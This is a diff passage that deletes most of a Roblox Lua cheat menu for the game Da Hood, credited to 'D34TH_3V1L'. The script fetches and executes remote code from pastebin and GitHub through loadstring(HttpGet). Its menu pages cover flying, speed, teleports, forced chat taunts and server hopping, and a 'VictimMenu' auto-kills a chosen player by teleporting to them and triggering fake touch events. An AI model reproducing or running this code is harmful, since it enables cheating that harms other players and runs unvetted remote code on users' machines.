@@ -1,2360 +1,786 @@
-
-local UILibrary = loadstring(game:HttpGet("https://pastebin.com/raw/V1ca2q9s"))()
-
-local MainUI = UILibrary.Load("D34TH_3V1L Gui [Discontinued]")
-local MainPage = MainUI.AddPage("Home")
-local CombatPage = MainUI.AddPage("Combat")
-local AutoBuyPage = MainUI.AddPage("Auto Buy")
-local teleportPage = MainUI.AddPage("Teleports")
-local FunstuffPage = MainUI.AddPage("Fun Stuff")
-local GodPage = MainUI.AddPage("God Stuff")
-local CashPage = MainUI.AddPage("Money")
-local AnimationsPage = MainUI.AddPage("Animations")
-local WallPage = MainUI.AddPage("ESP")
-
-
-local MaintLabel = MainPage.AddLabel("Main")
-
-FLYMODE = 'IY'
-FLYSPEED = 25
-
-local MainButton = MainPage.AddButton("Fly IY [X]", function()
-
-	if FLYMODE == 'Default' then
-		local plrsy = game.Players.LocalPlayer
-		local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
-		local mouse = plr:GetMouse()
-		localplayer = plrsy
-		if workspace:FindFirstChild("Core") then
-			workspace.Core:Destroy()
-		end
-		local Core = Instance.new("Part")
-		Core.Name = "Core"
-		Core.Size = Vector3.new(0.05, 0.05, 0.05)
-		spawn(function()
-			Core.Parent = workspace
-			local Weld = Instance.new("Weld", Core)
-			Weld.Part0 = Core
-			Weld.Part1 = localplayer.Character.LowerTorso
-			Weld.C0 = CFrame.new(0, 0, 0)
-		end)
-		workspace:WaitForChild("Core")
-		local torso = workspace.Core
-		flying = true
-		local speed=FLYSPEED
-		local keys={a=false,d=false,w=false,s=false}
-		local e1
-		local e2
-		local function start()
-			local pos = Instance.new("BodyPosition",torso)
-			local gyro = Instance.new("BodyGyro",torso)
-			pos.Name="EPIXPOS"
-			pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
-			pos.position = torso.Position
-			gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
-			gyro.cframe = torso.CFrame
-			repeat
-				wait()
-				Humanoid.PlatformStand=true
-				local new=gyro.cframe - gyro.cframe.p + pos.position
-				if not keys.w and not keys.s and not keys.a and not keys.d then
-					speed=FLYSPEED
-				end
-				if keys.w then
-					new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
-					speed=speed
-				end
-				if keys.s then
-					new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
-					speed=speed
-				end
-				if keys.d then
-					new = new * CFrame.new(speed,0,0)
-					speed=speed
-				end
-				if keys.a then
-					new = new * CFrame.new(-speed,0,0)
-					speed=speed
-				end
-				if speed>FLYSPEED then
-					speed=FLYSPEED
-				end
-				pos.position=new.p
-				if keys.w then
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
-				elseif keys.s then
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
-				else
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame
-				end
-			until flying == false
-			if gyro then gyro:Destroy() end
-			if pos then pos:Destroy() end
-			flying=false
-			Humanoid.PlatformStand=false
-			speed=FLYSPEED
-		end
-		e1=mouse.KeyDown:connect(function(key)
-			if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
-			if key=="w" then
-				keys.w=true
-			elseif key=="s" then
-				keys.s=true
-			elseif key=="a" then
-				keys.a=true
-			elseif key=="d" then
-				keys.d=true
-			elseif key=="x" then
-				if flying==true then
-					flying=false
-				else
-					flying=true
-					start()
-				end
-			end
-		end)
-		e2=mouse.KeyUp:connect(function(key)
-			if key=="w" then
-				keys.w=false
-			elseif key=="s" then
-				keys.s=false
-			elseif key=="a" then
-				keys.a=false
-			elseif key=="d" then
-				keys.d=false
-			end
-		end)
-		start()
-	else
-		repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
-		local mouse = game.Players.LocalPlayer:GetMouse()
-		repeat wait() until mouse
-		local plr = game.Players.LocalPlayer
-		local torso = plr.Character.Head
-		local flying = false
-		local deb = true
-		local ctrl = {f = 0, b = 0, l = 0, r = 0}
-		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-		local maxspeed = 5000
-		local speed = 5000
-		function Fly()
-			local bg = Instance.new("BodyGyro", torso)
-			bg.P = 9e4
-			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-			bg.cframe = torso.CFrame
-			local bv = Instance.new("BodyVelocity", torso)
-			bv.velocity = Vector3.new(0,0.1,0)
-			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-			repeat wait()
-				plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
-				if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
-					speed = speed+.0+(speed/maxspeed)
-					if speed > maxspeed then
-						speed = maxspeed
-					end
-				elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
-					speed = speed-5
-					if speed > 5 then
-						speed = -2
-					end
-				end
-				if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
-					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-				elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
-					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-				else
-					bv.velocity = Vector3.new(0,0.1,0)
-				end
-				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
-			until not flying
-			ctrl = {f = 0, b = 0, l = 0, r = 0}
-			lastctrl = {f = 0, b = 0, l = 0, r = 0}
-			speed = 5
-			bg:Destroy()
-			bv:Destroy()
-			plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
-		end
-		mouse.KeyDown:connect(function(key)
-			if key:lower() == "x" then
-				if flying then flying = false
-				else
-					flying = true
-					Fly()
-				end
-			elseif key:lower() == "w" then
-				ctrl.f = FLYSPEED
-			elseif key:lower() == "s" then
-				ctrl.b = -FLYSPEED
-			elseif key:lower() == "a" then
-				ctrl.l = -FLYSPEED
-			elseif key:lower() == "d" then
-				ctrl.r = FLYSPEED
-			end
-		end)
-		mouse.KeyUp:connect(function(key)
-			if key:lower() == "w" then
-				ctrl.f = 0
-			elseif key:lower() == "s" then
-				ctrl.b = 0
-			elseif key:lower() == "a" then
-				ctrl.l = 0
-			elseif key:lower() == "d" then
-				ctrl.r = 0
-			end
-		end)
-		Fly()
-	end
-end)
-
-local MainButton = MainPage.AddButton("FlySpeed [+]", function()
-
-	FLYSPEED = FLYSPEED + 1
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "",
-		Text = " [+] Fly Speed: " ..(tostring(FLYSPEED))..".",
-		Duration = 1,
-	})
-
-end)
-
-local MainButton = MainPage.AddButton("FlySpeed [-]", function()
-
-	FLYSPEED = FLYSPEED - 1
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "",
-		Text = " [-] Fly Speed: " ..(tostring(FLYSPEED))..".",
-		Duration = 1,
-	})
-
-end)
-
-local MainButton = MainPage.AddButton("TP[Q]", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/Da%20Hood%20TP%20Q'))()
-end)
-local MainButton = MainPage.AddButton("SuperHuman[Z]", function()
-	superhuman = false
-	plr = game.Players.LocalPlayer
-	mouse = plr:GetMouse()
-	mouse.KeyDown:connect(function(key)
-		if key == "z" and superhuman == false then
-			superhuman = true
-			game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
-			game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
-			game.Players.LocalPlayer.Character.Humz.JumpPower = 200
-		elseif key == "z" and superhuman == true then
-			superhuman = false
-			game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
-			game.Players.LocalPlayer.Character.Humz.JumpPower = 50
-			game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
-		end
-	end)
-end)
-local infinitezoom = MainPage.AddButton("Infinite Zoom", function()
-	game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
-end)
-local infinitezoom = MainPage.AddButton("Equip-All", function()
-	for _, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
-		if v:IsA("Tool") then
-			v.Parent = game:GetService("Players").LocalPlayer.Character
-		end
-	end
-end)
-
-local infinitezoom = MainPage.AddButton("Low-Gfx", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/LowGfx"))()
-end)
-local infinitezoom = MainPage.AddButton("Fog", function()
-	game:GetService("Lighting").FogEnd = math.huge
-end)
-local MainButton = MainPage.AddButton("Trash Talk", function()
-	function dowait()
-		wait(0.172)
-	end
-	local tbl_main = 
-		{
-			"U Mad" , 
-			"All"
-		}
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
-	dowait()
-	local tbl_main = 
-		{
-			"Get Aim . . ." , 
-			"All"
-		}
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
-	dowait()
-	local tbl_main = 
-		{
-			"Doggy" , 
-			"All"
-		}
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
-	dowait()
-	local tbl_main = 
-		{
-			"AirShoot lolll" , 
-			"All"
-		}
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
-end)
-local MainButton = MainPage.AddButton("Rejoin", function()
-	game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-end)
-local MainButton = MainPage.AddButton("Server Hop", function()
-
-	if not IrisNotificationMrJack then loadstring(game:HttpGet"https://raw.githubusercontent.com/thedragonslayer2/hey/main/Misc./iris%20notification%20function")()elseif IrisNotificationUserMrJack then IrisNotificationUserMrJack.ClearAllNotifications()end;warn"Looking For A Server"IrisNotificationMrJack(1,"Notification","Looking For A Server",2)local a,b,c="https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Desc&limit=100",{game.JobId}pcall(function()if not isfolder"MrJack Settings"then makefolder"MrJack Settings"end;b=game:GetService"HttpService":JSONDecode(readfile"MrJack Settings/ServerHop.json")end)local function d()pcall(function()writefile("MrJack Settings/ServerHop.json",game:GetService"HttpService":JSONEncode(b))end)end;local function e()while task.wait()do local f=game:GetService"HttpService":JSONDecode(game:HttpGetAsync(a))local g=f.nextPageCursor;for h,i in next,f.data do if type(i)=="table"and i.id and tonumber(i.playing)and tonumber(i.maxPlayers)and tonumber(i.maxPlayers)>tonumber(i.playing)and i.id~=game.JobId and not table.find(b,i.id)then c=i.id;warn("Server Found "..i.id)IrisNotificationMrJack(1,"Notification","Teleporting To Server\n"..i.id,5)table.insert(b,i.id)d()game:GetService"TeleportService":TeleportToPlaceInstance(game.PlaceId,i.id)wait(5)end end;if g then local j=a:find"&cursor="if j then a=a:gsub(a:sub(j),"")end;a=a.."&cursor="..g else break end end end;e()if c==nil then b={game.JobId}d()e()end;if c==nil then warn"Server Hop Failed"IrisNotificationMrJack(1,"Notification","No Server Found",2)end
-
-end)
-
-
-local MainButton = MainPage.AddButton("Anti-Grab", function()
-	local player = game.Players.LocalPlayer
-	local GC = game:GetService("Workspace").Players:WaitForChild(player.Name):FindFirstChild("GRABBING_CONSTRAINT")
-	if GC then
-		GC:Destroy()
-		wait(0.04)
-		player.character.Humanoid.Sit = true
-		wait(0.04)
-		game.Players.LocalPlayer.Character.Humanoid:ChangeState(3)
-	end
-end)
-local MainButton = MainPage.AddButton("Force-Reset", function()
-	for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-		if v:IsA("BasePart") then
-			v:Destroy()
-		end
-	end
-end)
-local MainButton = MainPage.AddButton("Unjail", function()
-	if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value >= 125 then
-		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
-		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
-		wait()
-		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
-		wait(.1)
-		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
-		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
-		repeat
-			wait()
-		until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
-		local Hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-		if Hum.Health > 0 then
-			key1 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
-			if key1 then
-				Hum:EquipTool(key1)
-				for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
-					if v:isA("Tool") then
-						game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(key1)
-						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
-						v:Activate()
-					end
-				end
-			end
-		end
-	end
-end)
-
-
-local infinitezoom = MainPage.AddButton("Anti-Flashbang", function()
-	while wait() do
-		pcall(function()
-			game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("MainScreenGui"):FindFirstChild("whiteScreen"):Destroy()
-		end)
-	end
-end)
-
-local MainToggle = MainPage.AddToggle("Anti-Fling", false, function(t)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()
-	setfflag("HumanoidParallelRemoveNoPhysics", "False")
-	setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
-	if t == true then
-		game:GetService('RunService'):BindToRenderStep("crash", 0 , function()
-			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
-		end)
-	elseif t == false then
-		game:GetService('RunService'):UnbindFromRenderStep("crash")
-	end
-end)
-
-
-
-
-local infinitezoom = MainPage.AddButton("AutoPick tools", function()
-
-	local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-	for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
-		if i.Name == "Part" then
-			if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame
-				if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
-					wait()
-				end
-			end
-		end
-	end
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
-
-end)
-
-local MainButton = MainPage.AddButton("Anti-Bag", function()
-	local LP = game.Players.LocalPlayer;
-
-	for i,v in ipairs(LP.Character:GetDescendants()) do
-		if v.Name == "Christmas_Sock" then v:Destroy()
-		end;
-	end;
-
-	LP.Character.ChildAdded:Connect(function()
-		wait(0.3)
-		for i,v in ipairs(LP.Character:GetDescendants()) do
-			if v.Name == "Christmas_Sock" then v:Destroy()
-			end;
-		end;
-	end);
-end)
-
-local infinitezoom = MainPage.AddButton("Anti-Equipment", function()
-	while wait() do
-		for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-			if v:IsA("Tool") then
-				v.Parent = game:GetService("Players").LocalPlayer.Backpack
-			end
-		end
-	end
-end)
-
-local infinitezoom = MainPage.AddButton("Invisible-Mask", function()
-	local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-	local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
-	if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
-		wait(.2)
-		fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
-		toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
-		toolf.Parent = game.Players.LocalPlayer.Character
-		wait()
-		game.Players.LocalPlayer.Character:WaitForChild("Mask")
-		game:GetService("VirtualUser"):ClickButton1(Vector2.new())
-		game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
-		game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
-	end
-end)
-
-local infinitezoom = MainPage.AddButton("Mask", function()
-	local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-	local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
-	if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
-		wait(.2)
-		fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
-		toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
-		toolf.Parent = game.Players.LocalPlayer.Character
-		wait()
-		game.Players.LocalPlayer.Character:WaitForChild("Mask")
-		game:GetService("VirtualUser"):ClickButton1(Vector2.new())
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
-	end
-end)
-
-
-
-
-
-local MainLabel = MainPage.AddLabel("Character")
-local MainButton = MainPage.AddButton("Fake-Korblox[Client]", function()
-	local ply = game.Players.LocalPlayer
-	local chr = ply.Character
-	chr.RightLowerLeg.MeshId = "902942093"
-	chr.RightLowerLeg.Transparency = "1"
-	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
-	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
-	chr.RightFoot.MeshId = "902942089"
-	chr.RightFoot.Transparency = "1"
-end)
-
-local MainButton = MainPage.AddButton("Headless", function()
-	game.Players.LocalPlayer.Character.Head.Transparency = 1
-	game.Players.LocalPlayer.Character.Head.Transparency = 1
-	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
-		if (v:IsA("Decal")) then
-			v.Transparency = 1
-		end
-	end
-end)
-local naked = MainPage.AddButton("Naked", function()
-	local function inTable(What, Table)
-		for Index, Value in pairs(Table) do
-			if What == Value then
-				return true
-			end
-		end
-		return false
-	end
-
-	local removingClasses = {
-		"Accessory",
-		"Pants",
-		"Shirt",
-	}
-
-	for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-		if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
-			Instance:Destroy()
-		end
-	end
-end)
-local MainButton = MainPage.AddButton("Anonymous", function()
-	pcall(function()
-		game.Players.LocalPlayer.Character.Shirt:Destroy()
-		game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
-		game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.RightUpperLeg.Size = Vector3.new(0,0,0)
-		game.Players.LocalPlayer.Character.RightUpperLeg.Massless = true
-		game.Players.LocalPlayer.Character.RightUpperLeg.CanCollide = false
-
-		heazd = true
-
-		while heazd == true do 
-			pcall(function()  
-				game.Players.LocalPlayer.Character.RightUpperLeg.RightHipRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
-				game.Players.LocalPlayer.Character.RightUpperLeg.CFrame = CFrame.new(0, 100000.4736328125, 0)
-			end)
-			wait()
-		end
-	end)
-	wait(0.10)
-	pcall(function()
-		game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
-		game.Players.LocalPlayer.Character.Pants:Destroy()
-		game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.LeftUpperLeg.Size = Vector3.new(0,0,0)
-		game.Players.LocalPlayer.Character.LeftUpperLeg.Massless = true
-		game.Players.LocalPlayer.Character.LeftUpperLeg.CanCollide = false
-
-		heazd = true
-
-		while heazd == true do 
-			pcall(function()  
-				game.Players.LocalPlayer.Character.LeftUpperLeg.LeftHipRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
-				game.Players.LocalPlayer.Character.LeftUpperLeg.CFrame = CFrame.new(0, 100000.4736328125, 0)
-			end)
-			wait()
-		end
-	end)
-	wait(0.10)
-	pcall(function()
-		game.Players.LocalPlayer.Character.Head.Neck:Destroy()
-		game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
-		game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
-		game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0,0,0)
-		game.Players.LocalPlayer.Character.Head.Massless = true
-		game.Players.LocalPlayer.Character.Head.CanCollide = false
-
-		heazd = true
-
-		while heazd == true do 
-			pcall(function()  
-				game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
-				game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
-				game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
-			end)
-			wait()
-		end
-	end)
-end)
-
--- Combat Page
-local FirstButton = CombatPage.AddButton("VictimMenu", function()
-
-
-	game.StarterGui:SetCore("SendNotification", {Title = "D34TH_3V1L [Target Gui]", Text = "we will never sell, our script will never have mod perms", Duration = 30
-
-	})
-
-	local player = game.Players.LocalPlayer
-
-	-- Variables --
-
-	Players = game:GetService('Players')
-	player = game.Players.LocalPlayer
-	Plr = game.Players.LocalPlayer
-	lokis = nil
-	Grab = nil
-	GC = nil
-	target = nil
-	Skid = nil
-	-------------------
-	-- Kill Teleport
-
-	Plr.CharacterAdded:Connect(function(character)
-		repeat wait() until character:FindFirstChild("FULLY_LOADED_CHAR")
-		e(character)
-	end)
-
-	function e(character)
-		print("Stop exploiting boy you ruin the games")
-		print("Made By D34TH_3V1L#0025")
-
-		for i, v in pairs(character:GetChildren()) do
-			if v:FindFirstChild("LocalScript") then
-				v:Destroy()
-			end
-		end
-	end
-
-
-	game.StarterGui:SetCore("SendNotification", {Title = "D34TH_3V1L [Target Gui]", Text = "Made by: D34TH_3V1L. ENJOY! ", Duration = 15
-
-	})
-
-	e(Plr.character)
-
-	-- Instances:
-
-	local TargetGui = Instance.new("ScreenGui")
-	local Frame = Instance.new("Frame")
-	local TextLabel = Instance.new("TextLabel")
-	local ScrollingFrame = Instance.new("ScrollingFrame")
-	local AutoKill = Instance.new("TextButton")
-	local Unautokill = Instance.new("TextButton")
-	local Lock = Instance.new("TextButton")
-	local View = Instance.new("TextButton")
-	local Bag = Instance.new("TextButton")
-	local Fling = Instance.new("TextButton")
-	local GoTo = Instance.new("TextButton")
-	local Info = Instance.new("TextButton")
-	local NameHere = Instance.new("TextBox")
-
-	--Properties:
-
-	TargetGui.Name = "TargetGui"
-	TargetGui.Parent = game.CoreGui
-
-	Frame.Parent = TargetGui
-	Frame.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
-	Frame.BackgroundTransparency = 0.350
-	Frame.Position = UDim2.new(0.299303949, 0, 0.318110228, 0)
-	Frame.Size = UDim2.new(0, 158, 0, 279)
-
-	TextLabel.Parent = Frame
-	TextLabel.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
-	TextLabel.BackgroundTransparency = 0.600
-	TextLabel.Position = UDim2.new(0.041543074, 0, 0.0332740843, 0)
-	TextLabel.Size = UDim2.new(0, 144, 0, 33)
-	TextLabel.Font = Enum.Font.SourceSansBold
-	TextLabel.Text = "D34TH Target Gui"
-	TextLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
-	TextLabel.TextSize = 19.000
-
-	ScrollingFrame.Parent = Frame
-	ScrollingFrame.Active = true
-	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
-	ScrollingFrame.BackgroundTransparency = 0.350
-	ScrollingFrame.Position = UDim2.new(0.0352141298, 0, 0.171100393, 0)
-	ScrollingFrame.Size = UDim2.new(0, 144, 0, 183)
-	ScrollingFrame.CanvasPosition = Vector2.new(0, 150)
-
-	AutoKill.Name = "AutoKill"
-	AutoKill.Parent = ScrollingFrame
-	AutoKill.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	AutoKill.BackgroundTransparency = 0.350
-	AutoKill.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	AutoKill.Position = UDim2.new(0.127792194, 0, 0.021482816, 0)
-	AutoKill.Size = UDim2.new(0, 106, 0, 24)
-	AutoKill.Font = Enum.Font.SourceSans
-	AutoKill.Text = "AutoKill"
-	AutoKill.TextColor3 = Color3.fromRGB(0, 0, 0)
-	AutoKill.TextSize = 23.000
-	AutoKill.MouseButton1Click:Connect(function()
-		AutoKill = true
-		local localPlayer     = game:GetService("Players").LocalPlayer;
-		local localCharacter  = localPlayer.Character;
-
-
-		if AutoKill == true then
-
-			jo = game:GetService('Players').LocalPlayer
-			AX1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.X
-			AY1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
-			AZ1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
-
-			print("AutoKill Enabled")
-
-			game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
-				local success, err = pcall(function()
-					if player.Character.BodyEffects.Attacking.Value == true then
-						for i,v in pairs(game:GetService('Players'):GetChildren()) do
-							if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
-								if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
-									if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
-										firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
-									else
-										firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
-										firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
-										firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
-										firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
-										firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
-										firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
-									end
-								end
-							end
-						end
-					end
-				end)
-			end)
-
-			game:GetService('RunService'):BindToRenderStep("Auto-Kill", 0 , function()
-
-
-				if game.Players[target].Character.BodyEffects['K.O'].Value == false then
-
-
-
-					pcall(function()Plr.Character.Humanoid:EquipTool(Plr.Backpack.Combat)end)		
-
-
-					Plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[NameHere.Text].Character.UpperTorso.Position + Vector3.new(0, -11, 0))
-
-					pcall(function()
-						Plr.Character.Combat:Activate()
-					end)
-
-				end
-
-
-				if game.Players[target].Character.BodyEffects['K.O'].Value == true then
-
-
-
-					game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
-
-					Plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[NameHere.Text].Character.UpperTorso.Position + Vector3.new(0, 3, 0))
-
-
-
-				end
-
-			end)
-		end
-	end)
-
-	Unautokill.Name = "Unautokill"
-	Unautokill.Parent = ScrollingFrame
-	Unautokill.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	Unautokill.BackgroundTransparency = 0.350
-	Unautokill.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	Unautokill.Position = UDim2.new(0.127792194, 0, 0.0752462745, 0)
-	Unautokill.Size = UDim2.new(0, 106, 0, 24)
-	Unautokill.Font = Enum.Font.SourceSans
-	Unautokill.Text = "UnAutokill"
-	Unautokill.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Unautokill.TextSize = 23.000
-	Unautokill.MouseButton1Click:Connect(function()
-
-		AutoKill = false  
-		print("AutoKill Disabled")
-		game:GetService('RunService'):UnbindFromRenderStep("Reach")
-		game:GetService('RunService'):UnbindFromRenderStep("Auto-Kill")
-
-		jo = game:GetService('Players').LocalPlayer
-		jo.Character.HumanoidRootPart.CFrame = CFrame.new(AX1,AY1,AZ1)
-
-	end)
-
-	Lock.Name = "Lock"
-	Lock.Parent = ScrollingFrame
-	Lock.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	Lock.BackgroundTransparency = 0.350
-	Lock.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	Lock.Position = UDim2.new(0.127792194, 0, 0.127217591, 0)
-	Lock.Size = UDim2.new(0, 106, 0, 24)
-	Lock.Font = Enum.Font.SourceSans
